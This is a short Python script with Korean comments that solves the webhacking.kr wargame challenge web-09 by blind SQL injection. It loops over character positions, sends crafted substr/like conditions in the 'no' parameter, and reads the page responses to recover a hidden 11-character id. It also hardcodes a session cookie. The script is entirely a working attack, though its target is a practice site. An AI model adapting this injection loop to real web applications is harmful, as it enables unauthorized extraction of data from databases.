from http import client
 
conn = client.HTTPConnection('webhacking.kr',80)
 
headers = {'Cookie': 'PHPSESSID=fca36526f085fed53e76dd2f2fa77703'}
 
base="/challenge/web/web-09/?no="
 
tryList=[]
awsList=[]
 
print('test')
 
for i in range(41,126): # 시도할 문자를 정리한다.
    tryList.append(chr(i))
    # print(str(tryList))
     
for i in range(1,12): # id의 문자열이 11개이므로 11번 반복해 준다.
    for w in tryList:
        url="if((substr(id,"+str(i)+",1)like("+hex(ord(w))+")),3,0)" # 보낼 쿼리의 작성        
        conn.request('PUT', base+url,'',headers)
        res = conn.getresponse()
        resData=res.read()  # 가져온 페이지의 데이터를 읽는다.
        strRes = str(resData) # 가져온 페이지의 데이터를 문자열로 형변환한다.
         
        #print(strRes)
         
        if(strRes.find('Password') == -1) : #가져온 웹 페이지에 'Password' 문자열이 있을 경우
            print("i="+str(i)+" value="+hex(ord(w)))
            awsList.append(w)
            break
             
             
print("정답은"+str(awsList)+"입니다.")
conn.close()
#print cc
